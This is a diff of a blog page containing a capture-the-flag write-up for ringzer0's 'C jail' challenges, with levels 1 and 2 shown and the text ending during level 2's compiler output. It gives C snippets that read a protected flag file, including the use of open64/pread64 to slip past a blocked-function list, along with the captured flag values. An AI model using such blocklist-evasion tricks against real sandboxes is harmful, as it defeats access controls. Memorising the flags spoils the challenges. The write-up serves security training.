@@ -1,13 +1,99 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><title>ringzer0 CTF - Jail Escaping C - blog.dornea.nu</title><meta content="ringzer0 CTF - Jail Escaping C  - blog.dornea.nu" property="title"><meta content="ringzer0 CTF - Jail Escaping C  - blog.dornea.nu" property="og:title"><meta property="og:description" content="Here are my solutions for the ringzer0 Jail Escaping C challenges:
- Level 1: https://ringzer0team.com/challenges/228 Level 2: https://ringzer0team.com/challenges/229 Level 3: https://ringzer0team.com/challenges/230  Level 1 level1@ringzer0team.com's password: Last login: Sun Apr 24 05:48:42 2016 from RingZer0 Team Online CTF C Jail Level 1: Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1) Flag is located at /home/level1/flag.txt Challenge instruction: ----------------------------- Type DONE to compile and execute your binary. Your payload will be compiled that way: gcc -O3 -Wall -fstack-protector-all -fPIE bin."><meta property="og:type" content="article"><meta property="og:url" content="http://blog.dornea.nu/2016/09/19/ringzer0-ctf-jail-escaping-c/"><meta property="article:published_time" content="2016-09-19T00:00:00+00:00"><meta property="article:modified_time" content="2016-09-19T00:00:00+00:00"><meta name=generator content="Hugo 0.75.1"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel=stylesheet><style type=text/css>:root{--main-color: #8C6056;--secondary-color: #AFD5AA;--logo-text-color: #fff;--body-text-color: #3d3d3d;--heading-text-color: #383838;--background-color: #fff}</style><link href=http://blog.dornea.nu/css/tachyons.min.css rel=stylesheet><link href=http://blog.dornea.nu/css/styles.css rel=stylesheet><link rel=icon href=http://blog.dornea.nu/favicon.ico type=image/x-icon><link href=http://blog.dornea.nu/feed.xml rel=alternate type=application/atom+xml title=blog.dornea.nu></head><body class=global-font><nav class="flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id=navbar><div class=flex><a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id=site-title href=http://blog.dornea.nu/ title=Home>blog.dornea.nu</a></div><div class="flex-ns mt2 mt0-ns pv1"><a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/ title=Home>Home</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://dornea.nu title=About>About</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/tags title=Tags>Tags</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org title=Zettelkasten>Zettelkasten</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bookmarks.html title=Bookmarks>Bookmarks</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=https://brainfck.org/bib.html title=Books>Books</a>
-<a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href=http://blog.dornea.nu/notes title=Notes>Notes</a></div></nav><main class="center mv4 content-width ph3"><div class="f3 fw6 heading-color heading-font post-title">ringzer0 CTF - Jail Escaping C</div><p class="silver f6 mt1 mb4 post-meta"><time>19 Sep 2016</time>
-|
-tags: [ <a href=http://blog.dornea.nu/tags/ringzer0 class="link silver">ringzer0</a> <a href=http://blog.dornea.nu/tags/ctf class="link silver">ctf</a> <a href=http://blog.dornea.nu/tags/wargames class="link silver">wargames</a> <a href=http://blog.dornea.nu/tags/c class="link silver">c</a> ]</p><div class="lh-copy post-content"><p>Here are my solutions for the <a href=https://ringzer0team.com>ringzer0</a> <strong>Jail Escaping C</strong> challenges:</p><ul><li>Level 1: <a href=https://ringzer0team.com/challenges/228>https://ringzer0team.com/challenges/228</a></li><li>Level 2: <a href=https://ringzer0team.com/challenges/229>https://ringzer0team.com/challenges/229</a></li><li>Level 3: <a href=https://ringzer0team.com/challenges/230>https://ringzer0team.com/challenges/230</a></li></ul><h1 id=level-1>Level 1</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>level1@ringzer0team.com&#39;s password: 
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
+
+  <title>ringzer0 CTF - Jail Escaping C  - blog.dornea.nu</title>
+  <meta content='ringzer0 CTF - Jail Escaping C  - blog.dornea.nu' property='title' />
+  <meta content='ringzer0 CTF - Jail Escaping C  - blog.dornea.nu' property='og:title' />
+
+
+<meta property="og:description" content="Here are my solutions for the ringzer0 Jail Escaping C challenges:
+ Level 1: https://ringzer0team.com/challenges/228 Level 2: https://ringzer0team.com/challenges/229 Level 3: https://ringzer0team.com/challenges/230  Level 1 level1@ringzer0team.com&#39;s password: Last login: Sun Apr 24 05:48:42 2016 from RingZer0 Team Online CTF C Jail Level 1: Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1) Flag is located at /home/level1/flag.txt Challenge instruction: ----------------------------- Type DONE to compile and execute your binary. Your payload will be compiled that way: gcc -O3 -Wall -fstack-protector-all -fPIE bin." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://blog.dornea.nu/2016/09/19/ringzer0-ctf-jail-escaping-c/" />
+
+
+<meta property="article:published_time" content="2016-09-19T00:00:00&#43;00:00"/>
+
+<meta property="article:modified_time" content="2016-09-19T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.78.1" />
+
+<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
+<style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
+:root {
+  --main-color: #8C6056; 
+  --secondary-color: #AFD5AA;
+  --logo-text-color: #fff;
+  --body-text-color: #3d3d3d;
+  --heading-text-color: #383838;
+  --background-color: #fff;
+}</style>
+<link href='http://blog.dornea.nu/css/tachyons.min.css' rel="stylesheet">
+<link href='http://blog.dornea.nu/css/styles.css' rel="stylesheet">
+
+
+<link rel="icon" 
+ 
+  href='http://blog.dornea.nu/favicon.ico'
+
+type="image/x-icon"/>
+
+<link href='http://blog.dornea.nu/feed.xml' rel="alternate" type="application/atom+xml" title="blog.dornea.nu" />
+</head>
+<body class="global-font">
+  <nav class=" flex-ns justify-between border-box pa3 pl3-l pr2-l mt1 mt0-ns" id="navbar">
+  <div class="flex">
+    <a class="f4 fw6 ttu no-underline dim bg-main-color pv1 ph2 br2" id="site-title" href='http://blog.dornea.nu/' title="Home">blog.dornea.nu</a>
+  </div>
+  
+  <div class=" flex-ns mt2 mt0-ns pv1">
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/' title="Home">Home</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://dornea.nu' title="About">About</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/tags' title="Tags">Tags</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org' title="Zettelkasten">Zettelkasten</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bookmarks.html' title="Bookmarks">Bookmarks</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='https://brainfck.org/bib.html' title="Books">Books</a>
+    
+      <a class="link dim dark-gray f6 dib mr2 mr3-l ttu tracked" href='http://blog.dornea.nu/notes' title="Notes">Notes</a>
+    
+  </div>
+  
+</nav>
+  
+<main class="center mv4 content-width ph3">
+  <div class="f3 fw6 heading-color heading-font post-title">ringzer0 CTF - Jail Escaping C </div>
+  <p class="silver f6 mt1 mb4 post-meta">
+    <time>19 Sep 2016</time> 
+     | 
+    
+    
+    tags: [ <a href='http://blog.dornea.nu/tags/ringzer0' class="link silver">ringzer0</a> <a href='http://blog.dornea.nu/tags/ctf' class="link silver">ctf</a> <a href='http://blog.dornea.nu/tags/wargames' class="link silver">wargames</a> <a href='http://blog.dornea.nu/tags/c' class="link silver">c </a>  ]
+    
+  </p>
+  <div class="lh-copy post-content"><p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping C</strong> challenges:</p>
+<ul>
+<li>Level 1: <a href="https://ringzer0team.com/challenges/228">https://ringzer0team.com/challenges/228</a></li>
+<li>Level 2: <a href="https://ringzer0team.com/challenges/229">https://ringzer0team.com/challenges/229</a></li>
+<li>Level 3: <a href="https://ringzer0team.com/challenges/230">https://ringzer0team.com/challenges/230</a></li>
+</ul>
+<h1 id="level-1">Level 1</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">level1@ringzer0team.com&#39;s password: 
 Last login: Sun Apr 24 05:48:42 2016 from
 
 RingZer0 Team Online CTF
@@ -44,66 +130,69 @@ You CANNOT use the &#34;asm&#34; keyword
 
 -----------------------------
 Your C code:
-</code></pre></div><p>So obviously I have to write some C code to read the content of <code>/home/level1/flag.txt</code>. <code>fopen</code>/<code>fread</code> are not allowed so let&rsquo;s do it using <code>open</code>/<code>read</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;stdio.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;string.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;stdlib.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;unistd.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;fcntl.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;sys/types.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;sys/stat.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700></span>
-<span style=color:#6ab825;font-weight:700>int</span> <span style=color:#447fcf>main</span>(<span style=color:#6ab825;font-weight:700>int</span> argc, <span style=color:#6ab825;font-weight:700>char</span> **argv) {
-    <span style=color:#6ab825;font-weight:700>int</span> fd;
-    <span style=color:#6ab825;font-weight:700>char</span> *filename = <span style=color:#ed9d13>&#34;flag.txt&#34;</span>;
+</code></pre></div><p>So obviously I have to write some C code to read the content of <code>/home/level1/flag.txt</code>. <code>fopen</code>/<code>fread</code> are not allowed so let&rsquo;s do it using <code>open</code>/<code>read</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/stat.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold"></span>
+<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> **argv) {
+    <span style="color:#6ab825;font-weight:bold">int</span> fd;
+    <span style="color:#6ab825;font-weight:bold">char</span> *filename = <span style="color:#ed9d13">&#34;flag.txt&#34;</span>;
     ssize_t ret_in;
-    <span style=color:#6ab825;font-weight:700>char</span> buffer[<span style=color:#3677a9>100</span>];
+    <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">100</span>];
 
-    <span style=color:#999;font-style:italic>// Open file 
-</span><span style=color:#999;font-style:italic></span>    <span style=color:#6ab825;font-weight:700>if</span> ((fd = open(filename, O_RDONLY)) &lt; <span style=color:#3677a9>0</span>){
-        printf(<span style=color:#ed9d13>&#34;hello&#34;</span>);
+    <span style="color:#999;font-style:italic">// Open file 
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> ((fd = open(filename, O_RDONLY)) &lt; <span style="color:#3677a9">0</span>){
+        printf(<span style="color:#ed9d13">&#34;hello&#34;</span>);
     }
 
-    <span style=color:#999;font-style:italic>// Read content
-</span><span style=color:#999;font-style:italic></span>    <span style=color:#6ab825;font-weight:700>while</span> ((ret_in = read(fd, &amp;buffer, <span style=color:#3677a9>100</span>)) &gt; <span style=color:#3677a9>0</span>);
+    <span style="color:#999;font-style:italic">// Read content
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">while</span> ((ret_in = read(fd, &amp;buffer, <span style="color:#3677a9">100</span>)) &gt; <span style="color:#3677a9">0</span>);
 
-    <span style=color:#999;font-style:italic>// Print buffer
-</span><span style=color:#999;font-style:italic></span>    printf(<span style=color:#ed9d13>&#34;Flag: %s</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>, buffer);
-    <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#3677a9>0</span>;
+    <span style="color:#999;font-style:italic">// Print buffer
+</span><span style="color:#999;font-style:italic"></span>    printf(<span style="color:#ed9d13">&#34;Flag: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, buffer);
+    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
 
 }
 
-</code></pre></div><p>Keep in mind that you&rsquo;ll have to paste only the contents of <code>main()</code>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c>----------------------------
+</code></pre></div><p>Keep in mind that you&rsquo;ll have to paste only the contents of <code>main()</code>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">----------------------------
 Your C code:
-  <span style=color:#6ab825;font-weight:700>int</span> fd;
-    <span style=color:#6ab825;font-weight:700>char</span> *filename = <span style=color:#ed9d13>&#34;flag.txt&#34;</span>;
+  <span style="color:#6ab825;font-weight:bold">int</span> fd;
+    <span style="color:#6ab825;font-weight:bold">char</span> *filename = <span style="color:#ed9d13">&#34;flag.txt&#34;</span>;
     ssize_t ret_in;
-    <span style=color:#6ab825;font-weight:700>char</span> buffer[<span style=color:#3677a9>100</span>];
+    <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">100</span>];
 
-    <span style=color:#999;font-style:italic>// Open file 
-</span><span style=color:#999;font-style:italic></span>    <span style=color:#6ab825;font-weight:700>if</span> ((fd = open(filename, O_RDONLY)) &lt; <span style=color:#3677a9>0</span>){
-        printf(<span style=color:#ed9d13>&#34;hello&#34;</span>);
+    <span style="color:#999;font-style:italic">// Open file 
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> ((fd = open(filename, O_RDONLY)) &lt; <span style="color:#3677a9">0</span>){
+        printf(<span style="color:#ed9d13">&#34;hello&#34;</span>);
     }
 
-    <span style=color:#999;font-style:italic>// Read content
-</span><span style=color:#999;font-style:italic></span>    <span style=color:#6ab825;font-weight:700>while</span> ((ret_in = read(fd, &amp;buffer, <span style=color:#3677a9>100</span>)) &gt; <span style=color:#3677a9>0</span>);
+    <span style="color:#999;font-style:italic">// Read content
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">while</span> ((ret_in = read(fd, &amp;buffer, <span style="color:#3677a9">100</span>)) &gt; <span style="color:#3677a9">0</span>);
 
-    <span style=color:#999;font-style:italic>// Print buffer
-</span><span style=color:#999;font-style:italic></span>    printf(<span style=color:#ed9d13>&#34;Flag: %s</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>, buffer);
-    <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#3677a9>0</span>;
+    <span style="color:#999;font-style:italic">// Print buffer
+</span><span style="color:#999;font-style:italic"></span>    printf(<span style="color:#ed9d13">&#34;Flag: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, buffer);
+    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
 DONE
 
 -----------------------------
 Compiling your code.
-/tmp/ec5378ac-<span style=color:#3677a9>32f</span>b-<span style=color:#3677a9>4f</span><span style=color:#3677a9>92</span>-af6c-<span style=color:#3677a9>807569</span>d9a8be/bin.c: In function <span style=color:#a61717;background-color:#e3d2d2>‘</span>_ba91abe8889543278d28244379cec68d<span style=color:#a61717;background-color:#e3d2d2>’</span>:
-/tmp/ec5378ac-<span style=color:#3677a9>32f</span>b-<span style=color:#3677a9>4f</span><span style=color:#3677a9>92</span>-af6c-<span style=color:#3677a9>807569</span>d9a8be/bin.c:<span style=color:#3677a9>27</span>:<span style=color:#3677a9>5</span>: warning: <span style=color:#a61717;background-color:#e3d2d2>‘</span><span style=color:#6ab825;font-weight:700>return</span><span style=color:#a61717;background-color:#e3d2d2>’</span> with a value, in function returning <span style=color:#6ab825;font-weight:700>void</span> [enabled by <span style=color:#6ab825;font-weight:700>default</span>]
-     <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#3677a9>0</span>;
+/tmp/ec5378ac-<span style="color:#3677a9">32f</span>b-<span style="color:#3677a9">4f</span><span style="color:#3677a9">92</span>-af6c-<span style="color:#3677a9">807569</span>d9a8be/bin.c: In function <span style="color:#a61717;background-color:#e3d2d2">‘</span>_ba91abe8889543278d28244379cec68d<span style="color:#a61717;background-color:#e3d2d2">’</span>:
+/tmp/ec5378ac-<span style="color:#3677a9">32f</span>b-<span style="color:#3677a9">4f</span><span style="color:#3677a9">92</span>-af6c-<span style="color:#3677a9">807569</span>d9a8be/bin.c:<span style="color:#3677a9">27</span>:<span style="color:#3677a9">5</span>: warning: <span style="color:#a61717;background-color:#e3d2d2">‘</span><span style="color:#6ab825;font-weight:bold">return</span><span style="color:#a61717;background-color:#e3d2d2">’</span> with a value, in function returning <span style="color:#6ab825;font-weight:bold">void</span> [enabled by <span style="color:#6ab825;font-weight:bold">default</span>]
+     <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
      ^
 Executing your code.
 Flag: FLAG-ql3mI2Z8fGq56kK5QdwK8oMxgWwvji8R
-</code></pre></div><h1 id=level-2>Level 2</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c>RingZer0 Team Online CTF
+</code></pre></div><h1 id="level-2">Level 2</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">RingZer0 Team Online CTF
 
-C Jail Level <span style=color:#3677a9>2</span>:
-Current user is uid=<span style=color:#3677a9>1001</span>(level2) gid=<span style=color:#3677a9>1001</span>(level2) groups=<span style=color:#3677a9>1001</span>(level2)
+C Jail Level <span style="color:#3677a9">2</span>:
+Current user is uid=<span style="color:#3677a9">1001</span>(level2) gid=<span style="color:#3677a9">1001</span>(level2) groups=<span style="color:#3677a9">1001</span>(level2)
 
 Flag is located at /home/level2/flag.txt
 
@@ -121,45 +210,51 @@ LD_PRELOAD=./override.so ./bin
 
 You only control the content of a function.
 
-Here<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>s the <span style=color:#6ab825;font-weight:700>default</span> includes
-<span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;stdio.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;string.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;stdlib.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;unistd.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;fcntl.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;sys/types.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700>#include</span> <span style=color:#cd2828;font-weight:700>&lt;sys/stat.h&gt;</span><span style=color:#cd2828;font-weight:700>
-</span><span style=color:#cd2828;font-weight:700></span>
-You CANNOT use the <span style=color:#ed9d13>&#34;asm&#34;</span> keyword
+Here<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s the <span style="color:#6ab825;font-weight:bold">default</span> includes
+<span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;sys/stat.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span><span style="color:#cd2828;font-weight:bold"></span>
+You CANNOT use the <span style="color:#ed9d13">&#34;asm&#34;</span> keyword
 
 -----------------------------
 Your C code:
-</code></pre></div><p>Pretty much the same as in the first challenge. However, some functions like <code>fopen</code>, <code>open</code>, <code>fdopen</code> were not allowed. Finally I bought the hint:</p><blockquote><p>Is there a 64 bits wrapper for open?</p></blockquote><p>And of course there is <code>open64()</code>. <code>open()</code> and <code>open64()</code> use the <code>open</code> <strong>syscall</strong> internally. The main difference is that <code>open64()</code> is equivalent
-to <code>open()</code> with <em>O_LARGEFILE</em> in order to support <strong>large</strong> files in 32 bit applications. Here is my solution (shitty code, don&rsquo;t use in production :D):</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c>-----------------------------
+</code></pre></div><p>Pretty much the same as in the first challenge. However, some functions like <code>fopen</code>, <code>open</code>, <code>fdopen</code> were not allowed. Finally I bought the hint:</p>
+<blockquote>
+<p>Is there a 64 bits wrapper for open?</p>
+</blockquote>
+<p>And of course there is <code>open64()</code>. <code>open()</code> and <code>open64()</code> use the <code>open</code> <strong>syscall</strong> internally. The main difference is that <code>open64()</code> is equivalent
+to <code>open()</code> with <em>O_LARGEFILE</em> in order to support <strong>large</strong> files in 32 bit applications. Here is my solution (shitty code, don&rsquo;t use in production :D):</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">-----------------------------
 Your C code:
-   <span style=color:#6ab825;font-weight:700>char</span> buffer[<span style=color:#3677a9>100</span>];
+   <span style="color:#6ab825;font-weight:bold">char</span> buffer[<span style="color:#3677a9">100</span>];
     FILE *fp;
-    <span style=color:#6ab825;font-weight:700>int</span> fd;
-    fd = open64(<span style=color:#ed9d13>&#34;flag.txt&#34;</span>, O_RDONLY);
-    pread64(fd, buffer, <span style=color:#3677a9>100</span>, <span style=color:#3677a9>0</span>);
-    printf(<span style=color:#ed9d13>&#34;flag: %s</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>, buffer);
+    <span style="color:#6ab825;font-weight:bold">int</span> fd;
+    fd = open64(<span style="color:#ed9d13">&#34;flag.txt&#34;</span>, O_RDONLY);
+    pread64(fd, buffer, <span style="color:#3677a9">100</span>, <span style="color:#3677a9">0</span>);
+    printf(<span style="color:#ed9d13">&#34;flag: %s</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, buffer);
 DONE
 
 -----------------------------
 Compiling your code.
-/tmp/<span style=color:#3677a9>41</span>d5ddc3-<span style=color:#3677a9>8</span>d6b-<span style=color:#3677a9>42</span>ce-a2cf-<span style=color:#3677a9>1026f</span>cfe463f/bin.c: In function <span style=color:#a61717;background-color:#e3d2d2>‘</span>_4fa8c04676486ca36ba261f8387a2b9d<span style=color:#a61717;background-color:#e3d2d2>’</span>:
-/tmp/<span style=color:#3677a9>41</span>d5ddc3-<span style=color:#3677a9>8</span>d6b-<span style=color:#3677a9>42</span>ce-a2cf-<span style=color:#3677a9>1026f</span>cfe463f/bin.c:<span style=color:#3677a9>15</span>:<span style=color:#3677a9>5</span>: warning: implicit declaration of function <span style=color:#a61717;background-color:#e3d2d2>‘</span>open64<span style=color:#a61717;background-color:#e3d2d2>’</span> [-Wimplicit-function-declaration]
-     fd = open64(<span style=color:#ed9d13>&#34;flag.txt&#34;</span>, O_RDONLY);
+/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c: In function <span style="color:#a61717;background-color:#e3d2d2">‘</span>_4fa8c04676486ca36ba261f8387a2b9d<span style="color:#a61717;background-color:#e3d2d2">’</span>:
+/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c:<span style="color:#3677a9">15</span>:<span style="color:#3677a9">5</span>: warning: implicit declaration of function <span style="color:#a61717;background-color:#e3d2d2">‘</span>open64<span style="color:#a61717;background-color:#e3d2d2">’</span> [-Wimplicit-function-declaration]
+     fd = open64(<span style="color:#ed9d13">&#34;flag.txt&#34;</span>, O_RDONLY);
      ^
-/tmp/<span style=color:#3677a9>41</span>d5ddc3-<span style=color:#3677a9>8</span>d6b-<span style=color:#3677a9>42</span>ce-a2cf-<span style=color:#3677a9>1026f</span>cfe463f/bin.c:<span style=color:#3677a9>16</span>:<span style=color:#3677a9>5</span>: warning: implicit declaration of function <span style=color:#a61717;background-color:#e3d2d2>‘</span>pread64<span style=color:#a61717;background-color:#e3d2d2>’</span> [-Wimplicit-function-declaration]
-     pread64(fd, buffer, <span style=color:#3677a9>100</span>, <span style=color:#3677a9>0</span>);
+/tmp/<span style="color:#3677a9">41</span>d5ddc3-<span style="color:#3677a9">8</span>d6b-<span style="color:#3677a9">42</span>ce-a2cf-<span style="color:#3677a9">1026f</span>cfe463f/bin.c:<span style="color:#3677a9">16</span>:<span style="color:#3677a9">5</span>: warning: implicit declaration of function <span style="color:#a61717;background-color:#e3d2d2">‘</span>pread64<span style="color:#a61717;background-color:#e3d2d2">’</span> [-Wimplicit-function-declaration]
+     pread64(fd, buffer, <span style="color:#3677a9">100</span>, <span style="color:#3677a9">0</span>);
      ^
-/tmp/<span style=color:#3677a9>41</span>d5ddc3-<span style=color:#3677a9>8</span>d6b-<span style=color:#3677a9>42</span>ce-a2cf-<span style=color:#3677a9>1026f</span>cfe463f/bin.c:<span style=color:#3677a9>13</span>:<span style=color:#3677a9>11</span>: warning: unused variable <span style=color:#a61717;background-color:#e3d2d2>‘</span>fp<span style=color:#a61717;background-color:#e3d2d2>’</span> [-Wunused-variable]
